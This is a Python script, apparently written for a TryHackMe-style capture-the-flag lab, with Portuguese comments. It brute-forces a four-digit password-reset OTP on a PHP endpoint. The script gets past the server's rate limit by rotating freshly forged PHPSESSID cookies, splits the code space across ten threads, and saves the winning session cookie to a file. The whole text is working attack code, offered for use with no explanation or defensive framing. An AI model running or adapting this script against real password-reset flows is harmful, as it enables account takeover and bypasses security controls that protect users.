import requests
import concurrent.futures
import random
import string
import sys
import time

# --- CONFIGURAÇÕES ---
BASE_URL = "http://10.80.177.67:1337"
ENDPOINT = "/reset_password.php"
EMAIL = "tester@hammer.thm"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/140.0",
    "Content-Type": "application/x-www-form-urlencoded"
}
THREADS = 10  # Ajuste conforme necessário

# Variável global para parar todas as threads quando a senha for encontrada
found_event = False

def get_new_session():
    """Cria uma sessão limpa e inicia o fluxo para resetar o contador do servidor"""
    s = requests.Session()
    # Gera um PHPSESSID aleatório
    phpsessid = "hmr" + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    s.cookies.set("PHPSESSID", phpsessid)
    
    try:
        # Passo 1: Iniciar o fluxo com o email
        data = {"email": EMAIL}
        r = s.post(f"{BASE_URL}{ENDPOINT}", headers=HEADERS, data=data, allow_redirects=True)
        
        # Leitura dinâmica do Rate Limit
        if "Rate-Limit-Pending" in r.headers:
            limit = int(r.headers["Rate-Limit-Pending"])
            return s, limit
        else:
            # Fallback seguro se o header não existir
            return s, 5 
    except Exception as e:
        return None, 0

def brute_force_worker(code_range):
    global found_event
    
    # Cada thread inicia sua própria sessão
    session, limit = get_new_session()
    
    for code in code_range:
        if found_event:
            return

        otp = f"{code:04d}"
        
        # Se a sessão falhou na criação ou o limite está perigosamente baixo (1), renova.
        if session is None or limit <= 1:
            session, limit = get_new_session()
            if session is None:
                continue # Tenta na próxima iteração se der erro de rede

        # Dados do POST
        # Nota: Usamos 170 para simular um tempo válido, mas não 180 (início)
        data = {
            "recovery_code": otp,
            "s": "170" 
        }
        
        try:
            r = session.post(f"{BASE_URL}{ENDPOINT}", headers=HEADERS, data=data)
            
            # Atualiza o limite baseado na resposta do servidor
            if "Rate-Limit-Pending" in r.headers:
                limit = int(r.headers["Rate-Limit-Pending"])
            else:
                limit -= 1 

            # --- VERIFICAÇÃO DE SUCESSO ---
            # Se não tiver a mensagem de erro E não tiver pedindo o código de novo
            if "Invalid or expired recovery code" not in r.text and "Enter Recovery Code" not in r.text:
                found_event = True
                
                # Captura o ID da sessão vencedora
                winning_session = session.cookies.get("PHPSESSID")
                
                print(f"\n{'='*40}")
                print(f"[+] SUCESSO! O código correto é: {otp}")
                print(f"[+] SESSÃO VÁLIDA (PHPSESSID): {winning_session}")
                print(f"{'='*40}\n")
                
                # Opcional: Salvar em arquivo para não perder
                with open("flag_session.txt", "w") as f:
                    f.write(f"OTP: {otp}\nCookie: PHPSESSID={winning_session}")
                return

        except Exception as e:
            # Erros de conexão silenciosos para não poluir o terminal, 
            # mas decrementa o limite para forçar nova sessão
            limit = 0 

def start_attack():
    print(f"[*] Alvo: {BASE_URL}")
    print(f"[*] Iniciando ataque com {THREADS} threads...")
    
    # Divide 0000 a 9999 entre as threads
    total_codes = 10000
    chunk_size = total_codes // THREADS
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        for i in range(THREADS):
            start = i * chunk_size
            end = start + chunk_size
            # O último chunk pega o resto se a divisão não for exata
            if i == THREADS - 1:
                end = 10000
            
            futures.append(executor.submit(brute_force_worker, range(start, end)))

if __name__ == "__main__":
    start_attack()
